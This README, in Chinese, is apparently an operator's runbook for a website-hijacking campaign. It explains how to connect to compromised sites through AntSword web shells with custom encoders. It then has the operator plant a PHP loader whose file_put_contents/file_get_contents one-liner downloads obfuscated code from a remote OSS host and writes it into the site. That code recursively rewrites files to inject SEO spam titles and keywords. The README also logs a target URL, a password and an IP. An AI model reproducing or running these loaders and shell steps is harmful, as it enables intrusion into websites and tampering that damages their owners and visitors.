# README


## antsword配置
特殊的base64、rsa连接，需要先增加对应encode
见： ./config/antswords配置.md


## 修改shell流程：
1. 选择，encode方式，测试链接
2. 链接后找个位置放php，如/rewrite/httpd.php,这个php从oss获取要执行的php代码，
    - 参数1: 执行代码目录位置
    - 参数2: 云端最新代码连接
    配置完成之后执行一次， https://123456vip.top/rewrite/httpd.php
3. 执行修改代码，如:  https://123456vip.top/config/httpd.php?d=up&w=pa
    - 参数 d = dir, 指定开始递归便利的目录，可传: d=上一级，或者目录绝对路径，如： /www/wwwroot/xxx.com/
    - 参数 w = who, pa or be，两条线
 <?php file_put_contents("../config/httpd.php",file_get_contents("https://static.alicloudoss.com/mw/wbsh/del_do.min.txt"));?>
4. 修改完成之后做记录：
https://123456vip.top/template/template_init.php |mmk123 |  154.12.81.159
代码更新：0608 OK ✅
https://123456vip.top/rewrite/httpd.php
/www/wwwroot/74724/rewrite/httpd.php
<?php file_put_contents("/www/wwwroot/74724/config/httpd.php",file_get_contents("https://static.alicloudoss.com/mw/wbsh/del_do.min.txt"));?>
执行检查：
https://123456vip.top/config/httpd.php?d=up

## TDK自定义配置
域名-TDK配置在阿里云OSS，格式如：
./tech/ossconf/alltk.json

shell连接之后，从云端获取全局修改tdk代码，代码源码在:
./tech/code/del_do.php，混淆后为： del_do.php

通过php接口获取,代码如下，rdm=当前根域名，w=当前线的代号
```
<?php
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'http://mulu.apid-tw.cc/api/websh/phptdk?rdm=kimsitu.com&w=pa',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));
$response = curl_exec($curl);
curl_close($curl);
echo $response;
```